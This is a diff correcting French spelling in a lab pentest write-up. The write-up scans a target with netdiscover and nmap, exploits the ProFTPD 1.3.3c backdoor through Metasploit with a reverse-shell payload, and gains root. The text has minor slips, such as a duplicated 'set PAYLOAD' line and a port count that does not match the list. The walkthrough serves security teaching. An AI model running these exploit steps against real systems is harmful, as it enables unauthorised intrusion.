@@ -5,15 +5,15 @@
 
 1. L'attaquant peut-il accéder aux fichiers du système d'exploitation ?
 2. L'attaquant peut-il usurper l'identité du compte administrateur ?
-3. L'attaquant peut-il bloquer l'accès a l'administrateur ?
+3. L'attaquant peut-il bloquer l'accès à l'administrateur ?
 4. L'attaquant peut-il modifier le contenu du site web ?
-5. L'attaquant peut-il bloquer l'accès a l'administrateur a l'outil de conception de site web ?
+5. L'attaquant peut-il bloquer l'accès à l'administrateur à l'outil de conception de site web ?
 
-## Etape 1: Decouverte de la cible
+## Étape 1: Découverte de la cible
 
-### 1.1. Decouverte du reseau
+### 1.1. Découverte du réseau
 
-> Nous savons que la machine cible ce trouve sur le même réseau que notre machine nous allons donc utiliser le commande netdiscover pour trouver l'adresse IP de la machine cible.
+> Nous savons que la machine cible se trouve sur le même réseau que notre machine, nous allons donc utiliser la commande netdiscover pour trouver l'adresse IP de la machine cible.
 
 ```bash
 netdiscover -i eth1 -r 192.168.56.0/24
@@ -26,7 +26,7 @@ netdiscover -i eth1 -r 192.168.56.0/24
 
 **Nous voyons que la machine cible a pour adresse IP 192.168.56.102**
 
-### 1.2. Decouverte des services
+### 1.2. Découverte des services
 
 > Nous allons utiliser la commande nmap pour scanner les ports ouverts sur la machine cible. Nous allons d'abord commencer par un scan rapide pour voir les ports ouverts.
 
@@ -34,7 +34,7 @@ netdiscover -i eth1 -r 192.168.56.0/24
 nmap -p- 192.168.56.102 -vv -oN scan_global.txt
 ```
 
-**Nous avons découvert 2 ports ouverts sur la machine cible:**
+**Nous avons découvert 2 ports ouverts sur la machine cible :**
 - 21 (ftp)
 - 22 (ssh)
 - 80 (http)
@@ -47,7 +47,7 @@ nmap -p- 192.168.56.102 -vv -oN scan_global.txt
 nmap -p 21 -sV --script vuln 192.168.56.102 -vv -oN scan_ftp.txt
 ```
 
-**On peut observer dans le résultat du scan qu'il existe un grand nombre de vulnérabilité sur ce service et qu'il y a également une backdoor fonctionelle tester par nmap.**
+**On peut observer dans le résultat du scan qu'il existe un grand nombre de vulnérabilités sur ce service et qu'il y a également une backdoor fonctionnelle testée par nmap.**
 
 [Scan ftp](./file/scan_ftp.txt)
 
@@ -55,7 +55,7 @@ nmap -p 21 -sV --script vuln 192.168.56.102 -vv -oN scan_ftp.txt
 nmap -p 22 -sV --script vuln 192.168.56.102 -vv -oN scan_ssh.txt
 ```
 
-**Sur ce service nmap n'a tester aucune vulnérabilité, malgré qu'il y en ai un grand nombre.**
+**Sur ce service, nmap n’a testé aucune vulnérabilité, bien qu’il y en ait un grand nombre.**
 
 [Scan ssh](./file/scan_ssh.txt)
 
@@ -63,21 +63,22 @@ nmap -p 22 -sV --script vuln 192.168.56.102 -vv -oN scan_ssh.txt
 nmap -p 80 -sV --script vuln 192.168.56.102 -vv -oN scan_http.txt
 ```
 
-**Sur ce service nmap a repérer plusieurs vulnérabilité, il a également fait une énumération des fichiers et des dossiers du site web qui nous apprend la présence d'un répertoire /secret.**
+**Sur ce service nmap à repérer plusieurs vulnérabilités, il a de plus fait une énumération des fichiers et des dossiers du site web qui nous apprend la présence d’un répertoire /secret.**
 
 [Scan http](./file/scan_http.txt)
 
 ---
-**Maintenant que nous avons découvert les services qui sont derrière les ports ouverts nous allons pouvoir passer a l'utilisation des outils de pentest.**
+**Maintenant que nous avons découvert les services qui sont derrière les ports ouverts, nous allons pouvoir passer à l’utilisation des outils de pentest.**
+
 ---
 
 ## Etape 2: Introduction dans la cible
 
 ### 2.1. Introduction dans la cible
 
-> Nous allons utiliser le service ftp pour nous connecter a la machine cible et plus particulierement la backdoor repérer précedement.
+> Nous allons utiliser le service ftp pour nous connecter à la machine cible et plus particulièrement la backdoor repérer précédemment.
 >
-> Comme nous connaisons deja la version  nous allons chercher un exploit avec metasploit.
+> Comme nous connaissons déjà la version, nous allons chercher un exploit avec metasploit.
 
 ```bash
 msfconsole
@@ -89,18 +90,18 @@ search type:exploit proftpd 133c
 |---|----------------------------------------|-----------------|-----------|-------|-----------------------------------------------|
 | 0 | exploit/unix/ftp/proftpd_133c_backdoor | 2010-12-02      | excellent | No    | ProFTPD-1.3.3c Backdoor Command Execution    |
 
-**Metasploit nous propose un exploit qui correspond parfaitement a notre recherche. Nous alons donc pouvoir le mettre en oeuvre.**
+**Metasploit nous propose un exploit qui correspond parfaitement à notre recherche. Nous allons donc pouvoir le mettre en œuvre.**
 
 ```bash
 use exploit/unix/ftp/proftpd_133c_backdoor
 
-# On configure l'addresse de la cible
+# On configure l'adresse de la cible
 set RHOST 192.168.56.102
 
 # On configure le payload utilisé
 set PAYLOAD set PAYLOAD cmd/unix/reverse
 
-# On configure l'addresse IP de notre machine pour la connection en reverse
+# On configure l'adresse IP de notre machine pour la connexion en reverse
 set LHOST 192.168.56.103
 
 # On lance l'exploit
@@ -109,14 +110,14 @@ run
 
 **Nous avons maintenant un shell sur la machine cible.**
 
-## Etape 3: Atteinte des objectifs 1,2 et 3
+## Étape 3: Atteinte des objectifs 1,2 et 3
 
 ### 3.1. Atteinte de l'objectif 1
 *Rappel: L'attaquant peut-il accéder aux fichiers du système d'exploitation ?*
 
-> Grâce a notre connection en reverse nous avons un shell sur la machine cible. Nous allons donc pouvoir utiliser les commandes linux pour atteindre notre objectif.
+> Grâce à notre connexion en reverse, nous avons un shell sur la machine cible. Nous allons donc pouvoir utiliser les commandes Linux pour atteindre notre objectif.
 >
-> Comme nous somme root nous pouvons voir n'importe qu'elle fichier du système comme les fichiers des autres utilisateurs.
+> Comme nous sommes root, nous pouvons voir n’importe quelle fichier du système comme les fichiers des autres utilisateurs.
 
 ```bash
 ls /home
